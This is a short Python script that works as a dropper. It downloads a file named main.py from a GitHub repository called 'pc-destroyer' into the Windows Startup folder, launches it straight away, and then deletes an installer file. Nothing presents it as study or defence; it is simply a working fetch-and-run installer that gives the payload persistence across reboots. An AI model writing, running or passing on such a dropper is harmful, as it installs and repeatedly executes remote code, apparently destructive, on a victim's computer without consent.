# download https://github.com/Hamy-os/pc-destroyer/blob/main/main.py to the users startup folder

import os
import sys
import requests
import shutil
import time
import subprocess

def main():
    # get the users startup folder
    startup_folder = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    # download the main.py file
    r = requests.get('https://raw.githubusercontent.com/Hamy-os/pc-destroyer/main/main.py', allow_redirects=True)
    # save the main.py file to the users startup folder
    open(os.path.join(startup_folder, 'main.py'), 'wb').write(r.content)
    # run the main.py file
    subprocess.Popen([sys.executable, os.path.join(startup_folder, 'main.py')])
    # wait 5 seconds
    time.sleep(5)
    # delete the installer.py file
    os.remove(os.path.join(startup_folder, 'installer.py'))

if __name__ == '__main__':
    main()

